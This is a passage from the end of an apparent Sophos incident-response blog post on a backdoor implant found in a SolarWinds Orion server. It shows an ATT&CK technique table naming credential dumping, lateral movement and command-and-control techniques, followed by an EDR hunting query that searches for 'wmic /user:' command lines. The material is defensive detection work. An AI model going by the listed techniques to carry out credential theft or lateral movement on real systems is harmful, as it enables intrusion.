<td><a href="https://attack.mitre.org/techniques/T1070/004/">T1070.004</a>/<a href="https://attack.mitre.org/techniques/T1070/006/">.006</a></td>
<td>Defense Evasion</td>
<td>Indicator Removal on Host</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1003/003/">T1003.003</a></td>
<td>Credential Access</td>
<td>OS Credential Dumping: NTDS</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1556/">T1556</a></td>
<td>Credential Access</td>
<td>Modify Authentication Process</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1087/002/">T1087.002</a></td>
<td>Discovery</td>
<td>Account Discovery: Domain Account</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1570/">T1570</a></td>
<td>Lateral Movement</td>
<td>Lateral Tool Transfer</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1056/003/">T1056.003</a></td>
<td>Collection</td>
<td>Input Capture: Web Portal Capture</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1071/001/">T1071.001</a></td>
<td>Command and Control</td>
<td>Application Layer Protocol: Web Protocols</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1571/">T1571</a></td>
<td>Command and Control</td>
<td>Non-Standard Port</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h2>Intercept X EDR</h2>
<h3>Live Discover Query</h3>
<p><a href="https://twitter.com/AltShiftPrtScn">Peter Mackenzie</a>: In Sophos Rapid Response, we would use the query below to get started, this has 3 variables (begin, end, cmd) so you can set the date range you are looking at as well as the command you are looking for. For you example you might start by looking for the string: <code>% wmic /user:"%”%</code></p>
<p>Allowing for a wildcard at the start and end, as well as for any username. This would likely bring back any results where wmic was being used with someone’s credentials. The query itself brings back lots of useful information from our journals, including when the file was created, and which user executed the command.</p>
<pre>SELECT  
CAST(strftime('%Y-%m-%dT%H:%M:%SZ',datetime(spj.time,'unixepoch')) AS TEXT) DATE_TIME,   
spj.sophosPID,  
spj.pathname,  
spj.cmdline,  
strftime('%Y-%m-%dT%H:%M:%SZ',datetime(f.btime,'unixepoch')) AS First_Created_On_Disk,  
strftime('%Y-%m-%dT%H:%M:%SZ',datetime(f.ctime,'unixepoch')) AS Last_Changed,  
strftime('%Y-%m-%dT%H:%M:%SZ',datetime(f.mtime,'unixepoch')) AS Last_Modified,  
strftime('%Y-%m-%dT%H:%M:%SZ',datetime(f.atime,'unixepoch')) AS Last_Accessed,  
spj.parentSophosPid,  
strftime('%Y-%m-%dT%H:%M:%SZ',datetime(spj.processStartTime,'unixepoch')) AS Process_Start_Time,  
CASE WHEN strftime('%Y-%m-%dT%H:%M:%SZ',datetime(spj.endTime,'unixepoch')) = '1970-01-01 00:00:00'  
THEN '-' ELSE strftime('%Y-%m-%dT%H:%M:%SZ',datetime(spj.endTime,'unixepoch')) END AS Process_End_Time,  
spj.fileSize,  
spj.sid,  
u.username,  
spj.sha256  
FROM sophos_process_journal spj  
JOIN file f ON spj.pathname = f.path  
JOIN users u ON spj.sid = u.uuid  
WHERE spj.time &gt;= CAST($$begin$$ AS INT)  
AND spj.time &lt;= CAST($$end$$ AS INT)  

AND spj.cmdline LIKE '$$cmd$$';</pre>
<h2>Acknowledgements</h2>
<p>I would like to thank (in no particular order) Fraser Howard, Guido Denzler, Gabe Renfro, Jordon Carpenter, Tyler Wojcik, Jordan Konicki, Steven Lott, Mat Gangwer, Alemdar Halis, and Savio Lau for their efforts in detecting, investigating, and responding to this novel threat.</p>
			</div>
	<div class="mt-12">
		
<ul
	id="social-sharing"
	class="flex justify-center items-center space-x-6"
>
	<li class="facebook">
		<a
			class="js-share-modal"
			href="http://www.facebook.com/share.php?u=https://news.sophos.com/?p=72266&#038;title=MTR%20casebook:%20Uncovering%20a%20backdoor%20implant%20in%20a%20SolarWinds%20Orion%20server"
			data-title="MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server"
			title="Share on Facebook">
				<span class="sr-only">Share on Facebook</span>
				<svg
					width="8"
					height="16"
					xmlns="http://www.w3.org/2000/svg"
					class="text-sophos-gray-600 hover:text-black"
					fill="currentColor"
				>
					<path d="M7.145 8.006H4.903V16H1.581V8.006H0V5.182h1.581V3.354C1.581 2.045 2.202 0 4.933 0l2.461.01v2.742H5.608c-.291 0-.705.145-.705.77v1.66h2.533l-.291 2.824z" fill-rule="nonzero"/>
				</svg>
		</a>
	</li>
	<li class="twitter">
		<a
			class="js-share-modal"
			href="http://twitter.com/intent/tweet?text=MTR%20casebook%3A%20Uncovering%20a%20backdoor%20implant%20in%20a%20SolarWinds%20Orion%20server%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D72266"
			data-title=""
			title="Share on Twitter">
				<span class="sr-only">Share on Twitter</span>
				<svg
					width="14"
					height="13"
					xmlns="http://www.w3.org/2000/svg"
					class="text-sophos-gray-600 hover:text-black"
					fill="currentColor"
				>
					<path d="M12.567 3.238c.007.141.01.281.01.424 0 4.338-2.89 9.34-8.173 9.34-1.623 0-3.132-.543-4.403-1.475.225.03.453.045.685.045 1.346 0 2.584-.523 3.566-1.404-1.255-.028-2.317-.977-2.682-2.28a2.56 2.56 0 001.296-.056C1.554 7.53.562 6.203.562 4.613v-.04c.389.245.83.392 1.302.41C1.094 4.393.587 3.387.587 2.25c0-.602.142-1.166.388-1.65 1.416 1.986 3.534 3.292 5.92 3.43a3.735 3.735 0 01-.074-.749c0-1.813 1.286-3.28 2.873-3.28.825 0 1.572.397 2.096 1.034a5.324 5.324 0 001.824-.797c-.215.768-.67 1.41-1.263 1.816a5.178 5.178 0 001.65-.515 6.362 6.362 0 01-1.434 1.7" fill-rule="nonzero"/>
				</svg>
		</a>
	</li>
	<li class="linkedin">
		<a
			href="http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/"
			data-title="MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server"
			title="Share on LinkedIn"
			onclick="window.open(this.href, '', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;">
			<span class="sr-only">Share on LinkedIn</span>
			<svg
				width="16"
				height="16"
				xmlns="http://www.w3.org/2000/svg"
				class="text-sophos-gray-600 hover:text-black"
				fill="currentColor"
			>
				<path d="M16 15.293h-3.43v-5.52c0-1.386-.496-2.334-1.738-2.334-.946 0-1.512.64-1.76 1.256-.09.22-.113.526-.113.836v5.762H5.53s.044-9.35 0-10.316h3.43v1.46c.456-.705 1.27-1.703 3.091-1.703 2.256 0 3.95 1.473 3.95 4.643v5.916zM1.917 3.566h-.022C.745 3.566 0 2.773 0 1.783 0 .772.768 0 1.94 0c1.173 0 1.896.772 1.917 1.783 0 .99-.744 1.783-1.94 1.783zM.202 15.293h3.431V4.977H.203v10.316z" fill-rule="nonzero"/>
			</svg>
		</a>
	</li>
	<li class="comments">
		<a
			href="#comments"
			title="Leave a Reply"
			class="flex items-center space-x-1"
		>
			<svg
				width="16"
				height="16"
				xmlns="http://www.w3.org/2000/svg"
				class="text-sophos-gray-600 hover:text-black"
				fill="currentColor"
			>
				<path d="M8.5 0a7.5 7.5 0 11-3.916 13.898C3.317 15.273 1.773 15.36.256 15.135c1.011-1.185 1.678-2.357 2-3.517l-.007.027A7.5 7.5 0 018.5 0z" fill-rule="evenodd"/>
			</svg>
							<span class="font-medium font-sansMedium text-xs">3</span>
					</a>
	</li>
</ul>

			</div><!-- .entry-social -->
	</div>

</article><!-- #post-## -->

			<div class="container my-8 md:my-16">
				<div class="max-w-4xl mx-auto">
					<div class="article-author-block article-co-authors-block">
	
					<div class="author-block">
				<div class="author-block__profile">
					<img width="400" height="400" src="https://news.sophos.com/wp-content/uploads/2019/06/Greg-small.png?w=400" class="avatar avatar-400 photo wp-post-image" alt="" />				</div> <!-- .author-profile -->

				<div class="author-block__wrapper">
					<div class="author-block__content">

													<div class="author-block__about">
								About the Author							</div>
						
						<h3 class="author-block__name">
						<a href="https://news.sophos.com/en-us/author/greg-iddon/" title="Posts by Greg Iddon" class="author url fn" rel="author">Greg Iddon</a>						</h3>

						
							<div class="author-block__bio">
								<p>Greg is a strategist in the Sophos Technology Office and a manager for Sophos Managed Threat Response. Driven by a desire to make the digital world a safer place, Greg has a passion for cybersecurity that has consumed the past 15 years of his life. </p>
<p>A rampant, idiosyncratic nerd with a thoroughly 'British' sense of humour, Greg strongly believes that the complexities of computing and security can be made accessible, funny, and interesting to the masses, and takes every opportunity to share his passion with anyone who wishes to listen.</p>
							</div> <!-- .author-bio -->

					</div>
				</div>

			</div> <!-- .author-block-container -->
		
		</div>
				</div>
			</div>

			
<div class="pb-24 bg-white">
<div class="container">
<div class="max-w-5xl mx-auto">

			
			<h3 class="text-style-h2 md:my-8 my-4">
				Read Similar Articles			</h3>

			<div class="article-grid article-grid--3-column">
				<!-- Article -->
<article
	id="post-70291"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-70291 post type-post status-publish format-standard has-post-thumbnail hentry category-security-operations tag-mtr tag-sophos-managed-threat-response-mtr tag-sophos-mtr region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2020/10/27/mtr-casebook-an-active-adversary-caught-in-the-act/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2020/09/sophos-mtr-2.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				October 27, 2020			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2020/10/27/mtr-casebook-an-active-adversary-caught-in-the-act/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">MTR Casebook: An active adversary caught in the act</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
<!-- Article -->
<article
	id="post-69619"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-69619 post type-post status-publish format-standard has-post-thumbnail hentry category-mtr category-products tag-mtr tag-sophos-managed-threat-response-mtr region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2020/09/28/report-managed-detection-and-response-mdr-buyers-guide/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				September 28, 2020			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2020/09/28/report-managed-detection-and-response-mdr-buyers-guide/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">Report: Managed Detection and Response (MDR) Buyers Guide</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
<!-- Article -->
<article
	id="post-69538"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-69538 post type-post status-publish format-standard has-post-thumbnail hentry category-security-operations tag-maze tag-mtr tag-ransomware tag-sophos-managed-threat-response-mtr tag-sophos-mtr region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2020/09/22/mtr-casebook-blocking-a-15-million-maze-ransomware-attack/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				September 22, 2020			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2020/09/22/mtr-casebook-blocking-a-15-million-maze-ransomware-attack/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">MTR Casebook: Blocking a $15 million Maze ransomware attack</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
			</div>

	
</div>
</div>
</div> <!-- #secondary -->

			
<div class="bg-sophos-gray-50 px-4 pt-16 pb-8" id="comments">

			<div class="container max-w-4xl bg-white py-6 md:py-16 rounded-md">
		<h2 class="text-style-h2-lg mb-6 md:mb-12">
			<span>3</span> Comments		</h2>

		<section class="comments-list">
		<article class="comment even thread-even depth-1 parent " id="comment-236401" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://BrentAD1@differentview72.onmicrosoft.com" itemprop="author">Brent Deans</a>
											</h2>
					<time class="comment-meta-item" datetime="2021-02-13T22:37-05:00" itemprop="datePublished"><a href="#comment-236401" itemprop="url">13 February 2021 at 10:37 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Greg I enjoyed reading this article.I am facinated by the art of cyber threat detection and cybersecurity.Do you write any other public blogs or publication ? If so would you foward links to view ? Thanks in advance stay safe.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/?replytocom=236401#respond' data-commentid="236401" data-postid="72266" data-belowelement="comment-236401" data-respondelement="respond" data-replyto="Reply to Brent Deans" aria-label='Reply to Brent Deans'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-alicebarford odd alt depth-2  bystaff" id="comment-274755" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/9a5697f292a91006544f294569c26abd?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/9a5697f292a91006544f294569c26abd?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Greg Iddon											</h2>
					<time class="comment-meta-item" datetime="2021-07-08T12:30-04:00" itemprop="datePublished"><a href="#comment-274755" itemprop="url">08 July 2021 at 12:30 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Thank you for the immensely kind words. I don&#8217;t write outside of Sophos but we&#8217;ve plans for new blogs where I will be writing more! You can find all my Sophos pieces here: https://news.sophos.com/en-us/author/greg-iddon/<br />
And feel free to reach out or follow me on Twitter @secbug Always down to chat infosec  😊</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/?replytocom=274755#respond' data-commentid="274755" data-postid="72266" data-belowelement="comment-274755" data-respondelement="respond" data-replyto="Reply to Greg Iddon" aria-label='Reply to Greg Iddon'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment even thread-odd thread-alt depth-1  " id="comment-254001" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Tobias											</h2>
					<time class="comment-meta-item" datetime="2021-05-14T04:34-04:00" itemprop="datePublished"><a href="#comment-254001" itemprop="url">14 May 2021 at 4:34 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Great write up of what is usually a very technically detailed and somewhat abstract topic to many. Great work!</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/?replytocom=254001#respond' data-commentid="254001" data-postid="72266" data-belowelement="comment-254001" data-respondelement="respond" data-replyto="Reply to Tobias" aria-label='Reply to Tobias'>Reply</a>				</div>
			</div>

	</article></section>
				</div>
	
	
	<div class="container max-w-2xl py-6 md:py-16">
			<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://news.sophos.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> <span class="required-field-message" aria-hidden="true">Required fields are marked <span class="required" aria-hidden="true">*</span></span></p><p class="comment-form-comment"><label for="comment">Comment <span class="required" aria-hidden="true">*</span></label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required></textarea></p><p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" /></p>
<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
<input type="hidden" name="redirect_to" value="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/" id="redirect_to"><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='72266' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="14af7125e7" /></p><p style="display: none !important;"><label>&#916;<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="ak_js" value="19"/><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>	</div><!-- #respond -->
		</div>

</div><!-- #comments -->
</div><!-- #comments -->

		
		</main><!-- #main -->
	</div><!-- #primary -->


	</div> <!-- #content -->

	

<div class="bg-sophos-gray-50 md:py-16 px-4" x-data="subscribeForm()">
	<div class="container max-w-2xl" x-show="!subscribed">
	<div class="text-style-h2-lg">
		Subscribe to get the latest updates in your inbox.	</div>
	<form action="">
		<div class="flex flex-col my-6">
		<input
			type="text"
			placeholder="name@email.com"
			class="w-full"
			x-model="email"
			x-on:keydown="resetErrors()"
			required
		/>
		<div
			x-cloak
			x-show="message"
			x-text="message"
			class="font-sansMedium px-4 py-3 mt-2 text-sm font-medium text-white bg-black border rounded-md"
		></div>
		</div>
		<div class="mb-4 text-lg">
			Which categories are you interested in?		</div>
		<div class="my-2 space-y-1">
		<template
			x-for="category in Object.entries(categories)"
			:key="category[0]"
		>
			<div>
			<label
				x-bind:for="category[1].value"
				class="inline-flex items-center"
			>
				<input
				type="checkbox"
				x-bind:value="category[1].value"
				x-bind:id="category[1].value"
				x-bind:name="category[1].value"
				x-model="subscribeTo"
				/>
				<span
				class="text-style-form-label ml-2"
				x-text="category[1].name"
				>
				</span>
			</label>
			</div>
		</template>
		</div>
		<div class="mt-6">
		<input
			type="submit"
			class="round-button round-button--primary"
			@click.prevent="submit()"
			x-bind:value="buttonText()"
			x-bind:class="{ 'opacity-30 cursor-not-allowed': buttonDisabled() }"
			x-bind:disabled="buttonDisabled()"
		/>
		</div>
	</form>
	</div>

	<div class="container max-w-2xl" x-cloak x-show="subscribed && !loading">
	<div class="text-style-h2 md:text-3xl mb-4 text-2xl text-center">
		You’re now subscribed!	</div>
	<div
		class="text-lg text-center"
		x-text="`Check your email to confirm your subscription.`"
	></div>
	</div>
</div>

<script>
	let subscribeForm = function () {
	return {
		config: {
		endpoints: {
			signup:
			"https://sophos-mailchimp-signup.netlify.app/.netlify/functions/newsletter-signup",
		},
		},
		subscribed: false,
		loading: false,
		error: false,
		message: "",
		categories: {
		1: {
			name: decodeURIComponent( 'Products%20and%20Services' ),
			value: "products-services",
		},
		2: {
			name: decodeURIComponent( 'Threat%20Research' ),
			value: "threat-research",
		},
		3: {
			name: decodeURIComponent( 'Security%20Operations' ),
			value: "security-operations",
		},
		4: {
			name: decodeURIComponent( 'AI%20Research' ),
			value: "ai-research",
		},
		5: {
			name: decodeURIComponent( '%23SophosLife' ),
			value: "sophos-life",
		},
		},
		subscribeTo: [],
		email: "",

		reset() {
		this.loading = false;
		if (!this.error) {
			this.email = "";
		}
		},

		resetErrors() {
		this.error = false;
		this.message = "";
		},

		setError(message) {
		this.error = true;
		this.message = message;
		},

		setSuccess(message) {
		this.error = false;
		this.message = message;
		},

		emailIsValid(email) {
		return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
		},

		submit() {
		this.loading = true;
		this.resetErrors();

		const mcList = "8d6471d831";
		const mcLanguage = decodeURIComponent( 'en' );
		const mcTags = [...this.subscribeTo, mcLanguage];

		const payload = {
			email: this.email,
			listId: mcList,
			tags: mcTags,
			language: mcLanguage,
		};

		fetch(this.config.endpoints.signup, {
			method: "POST",
			headers: {
			"Content-Type": "application/json",
			},
			body: JSON.stringify(payload),
		})
			.then((r) => r.json())
			.then((data) => {
			if (data.status === "pending") {
				this.setSuccess(
					decodeURIComponent( 'You%20have%20been%20subscribed.%20Please%20check%20your%20email%20to%20confirm.' )
				);
				this.subscribed = true;
			} else if (
				data.status === "subscribed"
			) {
				this.setSuccess(
					decodeURIComponent( 'You%20are%20already%20subscribed.%20Thank%20you%21' )
				);
			} else {
				this.setError(
					decodeURIComponent( 'We%20could%20not%20subscribe%20you.%20Please%20try%20again.' )
				);
			}
			})
			.catch((e) => {
			this.setError(
				decodeURIComponent( 'We%20could%20not%20subscribe%20you.%20Please%20try%20again.' )
			);
			})
			.finally(() => {
			this.reset();
			});
		},

		buttonText() {
		return this.loading ? decodeURIComponent( 'Please%20Wait' ) : decodeURIComponent( 'Subscribe' );
		},

		buttonDisabled() {
		return (
			this.subscribeTo.length < 1 ||
			!this.emailIsValid(this.email) ||
			this.loading
		);
		},
	};
	};
</script>


	<footer
		class="bg-white border-t border-sophos-gray-200 "
		x-data="{ languageMenu: false, privacyMenu: false, legalMenu: false }"
	>
		<div class="container">
			<div class="md:flex-row md:items-center flex flex-col justify-between py-8">
				<div class="flex items-baseline flex-grow space-x-6">
					<!-- Language -->
					
<div class="relative mr-auto">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="languageMenu = !languageMenu"
		@click.away="languageMenu = false"
	>
		Change Region		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': languageMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>

	<!-- Language Menu -->
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="languageMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
											<li>
					<a href="https://news.sophos.com/es-419">
						América Latina					</a>
				</li>
															<li>
					<a href="https://news.sophos.com/pt-br">
						Brasil					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/de-de">
						Deutschland					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/en-us">
						English					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/fr-fr">
						France					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/es-es">
						Iberia					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/it-it">
						Italia					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/ja-jp">
						Japan					</a>
				</li>
									</ul>
	</div>
</div>

					<!-- Terms -->
					<a
						href="https://www.sophos.com/en-us/legal/sophos-website.aspx"
						class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block ml-auto text-xs font-medium leading-tight"
						>Terms</a
					>

					<!-- Privacy -->
					
<span class="relative">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="privacyMenu = !privacyMenu"
		@click.away="privacyMenu = false"
	>
		Privacy
		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': privacyMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="privacyMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx"
				>
					Privacy Notice				</a>
			</li>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/cookie-information.aspx"
				>
					Cookies				</a>
			</li>
		</ul>
	</div>
</span>

					<!-- Legal -->
					
<span class="relative">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="legalMenu = !legalMenu"
		@click.away="legalMenu = false"
	>
		Legal
		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': legalMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="legalMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal.aspx"
				>
					General				</a>
			</li>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx"
				>
					Modern Slavery Statement				</a>
			</li>
			<li>
				<a
